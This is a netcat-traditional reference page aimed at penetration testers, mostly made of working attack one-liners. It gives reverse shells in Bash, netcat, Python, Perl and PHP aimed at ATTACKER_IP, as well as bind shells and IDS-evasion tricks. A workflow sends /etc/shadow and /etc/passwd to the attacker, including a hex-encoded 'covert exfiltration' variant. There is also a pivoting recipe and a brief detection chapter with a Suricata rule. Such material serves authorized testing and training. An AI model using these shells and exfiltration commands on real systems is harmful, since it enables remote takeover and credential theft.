---
title: "netcat - TCP/IP Swiss Army Knife"
description: "Classic network utility for reading and writing data across network connections using TCP or UDP"
category: "reverse_shells"
mitre_tactic: command_and_control
mitre_tactic_id: TA0011
package: "netcat-traditional"
kali_install: "sudo apt install netcat-traditional"
version: "1.10"
---

# netcat

## Overview

netcat is the original TCP/IP swiss army knife, written by Hobbit. It reads and writes data across network connections using TCP or UDP protocol. Despite its simplicity, netcat is a powerful tool for network debugging, exploration, and creating reverse shells. The traditional version included in Kali Linux provides essential networking capabilities without the additional features found in ncat.

netcat operates in two modes: client mode (connecting to a remote host) and server mode (listening for incoming connections). It supports TCP and UDP protocols, can scan ports, transfer files, and create bidirectional data streams. The `-e` flag (available in netcat-traditional) allows executing a program upon connection, making it useful for creating shells.

The tool is designed to be a reliable "back-end" that can be used directly or driven by other programs and scripts. Its simplicity makes it easy to embed in scripts and combine with other tools for complex operations.

## Chapter 1: Installation

### Kali Linux

```bash
sudo apt update
sudo apt install netcat-traditional
```

### Verify Installation

```bash
nc.traditional -h
```

### Netcat Variants

Kali includes multiple netcat variants:
- `netcat-traditional` - Classic version with `-e` flag
- `netcat-openbsd` - OpenBSD version without `-e` flag
- `ncat` - Nmap's implementation with SSL support

```bash
# Check which version is installed
which nc
ls -la /usr/bin/nc*
```

## Chapter 2: Basic Usage

### Listen for Connections

```bash
nc -lvnp 4444
```

**Explanation**: `-l` enables listen mode, `-v` provides verbose output, `-n` skips DNS resolution, `-p` specifies the port. netcat waits for an incoming TCP connection on port 4444.

### Connect to Remote Host

```bash
nc 192.168.1.100 4444
```

**Explanation**: Initiates a TCP connection to the specified host and port. Once connected, both sides can send and receive data interactively.

### UDP Mode

```bash
nc -u -lvnp 4444
```

**Explanation**: The `-u` flag switches to UDP mode. UDP connections do not establish a formal handshake, making them connectionless. This affects reliability but can be useful for certain network scenarios.

### Verbose Output

```bash
nc -vvv -lvnp 4444
```

**Explanation**: Multiple `-v` flags increase verbosity. Three `-v` flags provide maximum detail, showing connection establishment and data transfer information.

## Chapter 3: Reverse Shells

### Bash Reverse Shell

```bash
# Attacker
nc -lvnp 4444

# Target
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

**Explanation**: The target initiates an outbound connection to the attacker's listener. Bash I/O is redirected through the TCP connection, providing an interactive shell on the attacker's terminal.

### Netcat with -e Flag

```bash
# Attacker
nc -lvnp 4444

# Target (netcat-traditional supports -e)
nc ATTACKER_IP 4444 -e /bin/bash
```

**Explanation**: The `-e` flag executes `/bin/bash` and connects its standard input/output/error to the network connection. This is only available in netcat-traditional, not netcat-openbsd.

### Netcat with FIFO

```bash
# Target
mkfifo /tmp/f; /bin/sh -i < /tmp/f 2>&1 | nc ATTACKER_IP 4444 > /tmp/f
```

**Explanation**: A named pipe (FIFO) is created to separate input and output streams. Commands typed on the attacker's side are sent to the shell, and output flows back through the pipe. This works with both netcat variants.

### Python Reverse Shell

```bash
# Attacker
nc -lvnp 4444

# Target
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

**Explanation**: Python creates a socket connection and redirects stdin, stdout, and stderr to the socket. This provides a shell without requiring netcat on the target.

### Perl Reverse Shell

```bash
# Target
perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

**Explanation**: Perl creates a socket and redirects I/O. Perl is commonly available on Linux systems, making this a reliable alternative.

### PHP Reverse Shell

```bash
# Target
php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

**Explanation**: PHP creates a socket and executes a shell. PHP is commonly installed on web servers.

## Chapter 4: Bind Shells

### Bind Shell (Target as Server)

```bash
# Target
nc -lvnp 4444 -e /bin/bash

# Attacker
nc 192.168.1.100 4444
```

**Explanation**: The target listens for connections and provides a shell when connected. The attacker connects to the target. This approach is less common because it requires the target to accept inbound connections, which firewalls typically block.

### Bind Shell with FIFO

```bash
# Target
mkfifo /tmp/f; /bin/sh -i < /tmp/f 2>&1 | nc -lvnp 4444 > /tmp/f

# Attacker
nc TARGET_IP 4444
```

**Explanation**: Uses a named pipe for bidirectional communication. This works with both netcat variants.

### Windows Bind Shell

```bash
# Windows target
nc -lvnp 4444 -e cmd.exe

# Attacker
nc TARGET_IP 4444
```

**Explanation**: On Windows, `cmd.exe` provides a command shell. The `-e` flag executes cmd.exe upon connection.

## Chapter 5: File Transfer

### Send File

```bash
# Receiver
nc -lvnp 4444 > received_file

# Sender
nc 192.168.1.100 4444 < file_to_send
```

**Explanation**: Data from the sender's file is transmitted over the TCP connection and saved to the receiver's file. This method transfers files through a single TCP connection, avoiding HTTP-based detection.

### Transfer Directory

```bash
# Sender
tar czf - /path/to/directory | nc ATTACKER_IP 4444

# Receiver
nc -lvnp 4444 | tar xzf -
```

**Explanation**: The directory is compressed with tar and piped through the network connection. The receiver decompresses and extracts the files. This maintains directory structure and permissions.

### Transfer with Progress

```bash
# Sender
pv file_to_send | nc TARGET_IP 4444

# Receiver
nc -lvnp 4444 | pv > received_file
```

**Explanation**: The `pv` command provides progress information during transfer. Useful for large files.

### Recursive Directory Transfer

```bash
# Sender
tar czf - /path/to/directory | nc -q 1 TARGET_IP 4444

# Receiver
nc -lvnp 4444 > backup.tar.gz && tar xzf backup.tar.gz
```

**Explanation**: The `-q 1` flag quits 1 second after EOF. This ensures the connection closes after the transfer completes.

## Chapter 6: Port Scanning

### TCP Port Scan

```bash
nc -zv 192.168.1.1 1-1000
```

**Explanation**: The `-z` flag enables zero-I/O mode for scanning without data transfer. This scans TCP ports 1 through 1000, reporting open ports. This is a basic scan and does not detect filtered ports reliably.

### Port Scan with Timeout

```bash
nc -zv -w 2 192.168.1.1 21-25 80 443
```

**Explanation**: The `-w 2` flag sets a 2-second timeout for each connection attempt. This prevents hanging on unresponsive ports and speeds up scanning.

### UDP Port Scan

```bash
nc -zvu 192.168.1.1 53 67 68 123
```

**Explanation**: The `-u` flag switches to UDP mode. UDP scanning is unreliable because there is no handshake, but it can identify services like DNS (53), DHCP (67/68), and NTP (123).

### Randomized Port Scan

```bash
nc -zv -r 192.168.1.1 1-1000
```

**Explanation**: The `-r` flag randomizes the order of port scanning. This can help evade detection by IDS systems that look for sequential scanning patterns.

## Chapter 7: Chat and Banner Grabbing

### Chat Server

```bash
# Server
nc -lvnp 4444

# Client
nc 192.168.1.100 4444
```

**Explanation**: Without command execution or file redirection, netcat provides a bidirectional text communication channel. Both sides type messages that appear on the other side's terminal.

### HTTP Banner Grabbing

```bash
nc 192.168.1.1 80
GET / HTTP/1.1
Host: 192.168.1.1

```

**Explanation**: Connect to a web server and manually send an HTTP request. The server's response reveals the web server software, version, and other identifying information.

### SMTP Banner Grabbing

```bash
nc 192.168.1.1 25
EHLO test
```

**Explanation**: Connect to an SMTP server and send an EHLO command. The server responds with its capabilities, revealing the mail server software and supported features.

### FTP Banner Grabbing

```bash
nc 192.168.1.1 21
```

**Explanation**: Connect to an FTP server. The server immediately sends its banner, including the software version and any configured message.

### SSH Banner Grabbing

```bash
nc 192.168.1.1 22
```

**Explanation**: Connect to an SSH server. The server sends its banner immediately, revealing the SSH software and version.

## Chapter 8: Advanced Techniques

### Persistent Listener

```bash
nc -lvnp 4444 -k
```

**Explanation**: The `-k` flag keeps netcat listening after a client disconnects. This allows multiple sequential connections without restarting the listener. Useful for accepting multiple reverse shells.

### Randomized Ports

```bash
nc -l -p 0
```

**Explanation**: Specifying port 0 causes the OS to assign a random available port. This can be useful for evading port-based detection, though the port must be communicated to the connecting party.

### Source Port Spoofing

```bash
nc -p 53 -lvnp 4444
```

**Explanation**: Spoofing the source port as 53 (DNS) may bypass some firewall rules. Some network devices trust DNS traffic and may allow it through even with restrictive ACLs.

### Connection Relay

```bash
nc -lvnp 4444 | nc TARGET_IP 5555
```

**Explanation**: Pipes data between a local listener and a remote host. Connections to port 4444 are forwarded to port 5555 on the target, creating a simple port forwarding mechanism.

### Hex Dump Output

```bash
nc -lvnp 4444 -o output.hex
```

**Explanation**: The `-o` flag writes a hex dump of traffic to a file. Useful for analyzing binary protocols and debugging data transfer issues.

### Telnet Negotiation

```bash
nc -t -lvnp 4444
```

**Explanation**: The `-t` flag enables telnet negotiation. This allows netcat to handle telnet protocol options, useful for connecting to telnet services.

## Chapter 9: Detection and Defense

### Network Signatures

- Unusual outbound connections on non-standard ports
- High data transfer on control ports
- Long-lived connections with interactive characteristics

### IDS/IPS Detection

```
# Suricata rule for netcat shells
alert tcp any any -> any any (msg:"Netcat Shell Detected"; \
  flow:to_server,established; \
  content:"|0d 0a|"; \
  threshold:type both,track by_src, count 10, seconds 60; \
  sid:1000001; rev:1;)
```

### Log Analysis

```bash
# Monitor for unusual connections
ss -tnp | grep -E "ESTAB.*:[0-9]{4,5}"

# Check for netcat processes
ps aux | grep nc

# Review connection logs
grep -E "nc|netcat" /var/log/syslog
```

### Defense Recommendations

1. Monitor for outbound connections on non-standard ports
2. Implement egress filtering
3. Use host-based firewalls to restrict outbound connections
4. Monitor for process execution of netcat
5. Implement network segmentation

## Chapter 10: Troubleshooting

### Connection Refused

```bash
# Check if port is in use
ss -tlnp | grep 4444

# Check firewall rules
iptables -L -n

# Test with different port
nc -lvnp 4445
```

### Connection Timeout

```bash
# Increase timeout
nc -w 10 TARGET_IP 4444

# Check network connectivity
ping TARGET_IP

# Check routing
traceroute TARGET_IP
```

### Shell Not Interactive

```bash
# Use script for PTY
script -qc "nc -lvnp 4444" /dev/null

# Use python for PTY
python -c 'import pty; pty.spawn("/bin/bash")'
```

### Permission Denied

```bash
# Use privileged port
sudo nc -lvnp 80

# Use unprivileged port
nc -lvnp 4444
```

### Data Transfer Issues

```bash
# Add delay for slow connections
nc -i 1 TARGET_IP 4444 < file

# Use -q to close after transfer
nc -q 1 TARGET_IP 4444 < file
```

## Chapter 11: Real-World Scenarios

### Penetration Testing Workflow

```bash
# 1. Deploy netcat on compromised host
Attacker: nc -lvnp 4444
Target: nc ATTACKER_IP 4444 -e /bin/bash

# 2. Upgrade to interactive shell
Attacker: python -c 'import pty; pty.spawn("/bin/bash")'
# Press Ctrl+Z
Attacker: stty raw -echo; fg
export TERM=xterm

# 3. Transfer enumeration scripts
Attacker: nc -lvnp 4445 < linpeas.sh
Target: nc ATTACKER_IP 4445 > /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh

# 4. Exfiltrate data
Target: tar czf - /etc/shadow /etc/passwd | nc ATTACKER_IP 4446
Attacker: nc -lvnp 4446 > exfil.tar.gz
```

### Pivoting with Netcat

```bash
# Forward internal host through compromised pivot
# On compromised host (pivot):
nc -lvnp 8080 | nc INTERNAL_HOST 80

# Attacker connects to pivot:8080 to reach INTERNAL_HOST:80
nc PIVOT_IP 8080
```

### Covert Data Exfiltration

```bash
# Encode data as hex before transfer
Target: cat /etc/shadow | xxd -p | nc ATTACKER_IP 4444
Attacker: nc -lvnp 4444 | xxd -r -p > shadow_dump.txt
```

## Chapter 12: Ncat Comparison

### Ncat vs netcat-traditional

```bash
# Ncat with SSL support
ncat --ssl -lvnp 4444

# Ncat with SSL client
ncat --ssl TARGET_IP 4444

# Ncat access control
ncat -lvnp 4444 --allow 192.168.1.0/24

# Ncat chat mode
ncat --chat -lvnp 4444
```

**Explanation**: Ncat (part of the Nmap suite) provides SSL/TLS support, access control lists, and additional features not found in netcat-traditional. Use ncat when encryption or access control is needed.

### When to Use Each Variant

| Feature | netcat-traditional | netcat-openbsd | ncat |
|---|---|---|---|
| `-e` flag | Yes | No | Yes |
| SSL/TLS | No | No | Yes |
| Access control | No | No | Yes |
| `-k` keep-alive | Yes | Yes | Yes |
| UDP support | Yes | Yes | Yes |

## Resources

- [netcat Homepage](http://www.stearns.org/nc/)
- [Kali Linux netcat Page](https://www.kali.org/tools/netcat/)
- [netcat man page](https://linux.die.net/man/1/nc)
- [Debian netcat Package](https://packages.debian.org/netcat-traditional)
- [Hobbit's Original netcat](http://www.stearns.org/nc/)
- [Nmap ncat Documentation](https://nmap.org/ncat/)
- [netcat OpenBSD Version](https://packages.debian.org/netcat-openbsd)
- [MITRE ATT&CK - Command and Control](https://attack.mitre.org/tactics/TA0011/)
